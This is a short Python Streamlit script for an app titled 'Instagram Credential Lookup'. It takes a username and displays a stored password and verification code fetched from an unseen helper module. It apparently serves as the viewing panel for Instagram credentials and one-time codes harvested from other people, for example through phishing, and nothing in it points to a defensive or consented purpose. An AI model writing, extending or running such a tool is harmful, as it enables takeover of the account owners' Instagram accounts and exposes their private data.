import streamlit as st
from core_utils import get_credentials

st.set_page_config(page_title="Credential Retrieval", layout="centered")
st.title("🔐 Instagram Credential Lookup")

username = st.text_input("Enter Instagram Username")
if st.button("Get Credentials"):
    if username:
        result = get_credentials(username)
        if result:
            st.success("✅ Credentials found:")
            st.code(f"Verification Code: {result[0]}\nPassword: {result[1]}")
        else:
            st.error("❌ No records found for this username.")
    else:
        st.warning("Please enter a username.")
